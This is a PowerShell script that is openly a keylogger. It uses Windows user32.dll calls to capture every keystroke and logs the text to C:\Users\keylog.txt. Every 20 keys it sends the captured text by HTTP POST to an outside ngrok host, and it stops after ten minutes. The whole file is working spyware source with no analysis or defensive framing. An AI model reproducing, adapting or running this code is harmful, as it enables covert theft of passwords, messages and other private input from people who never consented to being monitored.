
# Signatures for Windows API calls
$signatures = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

# Load signatures and make members available
$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

if ($null -eq $API) {
    Write-Host "Failed to load Windows API functions."
    exit
}

$uri = "https://a2e6-60-243-45-209.ngrok-free.app"
$headers = @{"Content-Type" = "application/json"}
$outputFilePath = "C:\Users\keylog.txt"
$keyCount = 0
$keyBuffer = @()
$startTime = Get-Date

# Loop to capture key presses
while ($true) {
    # Check if 10 minutes elapsed
    if ((Get-Date) -ge ($startTime.AddMinutes(10))) {
        Write-Host "10 minutes elapsed. Stopping keylogger."
        break
    }

    # Scan all ASCII codes above 8
    for ($ascii = 9; $ascii -le 254; $ascii++) {
        # Get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # Is key pressed?
        if ($state -eq -32767) {
            # Translate scan code to real code
            $virtualKey = $API::MapVirtualKey($ascii, 3)

            # Get keyboard state for virtual keys
            $kbstate = New-Object Byte[] 256
            $checkkbstate = $API::GetKeyboardState($kbstate)

            # Prepare a StringBuilder to receive input key
            $mychar = New-Object -TypeName System.Text.StringBuilder

            # Translate virtual key
            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

            if ($success) {
                # Add key to buffer
                $keyBuffer += $mychar.ToString()
                $keyCount++

                # Check if 20 key presses reached
                if ($keyCount -eq 20) {
                    # Convert key buffer to string without new lines
                    $keyBufferString = $keyBuffer -join ""

                    # Write captured text to file
                    Add-Content -Path $outputFilePath -Value $keyBufferString

                    Write-Host "Data written to file."

                    # Reset key count and buffer
                    $keyCount = 0
                    $keyBuffer = @()

                    # Send data to URI
                    $body = @{"keylog" = $keyBufferString} | ConvertTo-Json

                    Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body
                    Write-Host "Data sent to URI."
                }
            }
        }
    }

    Start-Sleep -Milliseconds 40
}

Write-Host "Keylogger stopped."
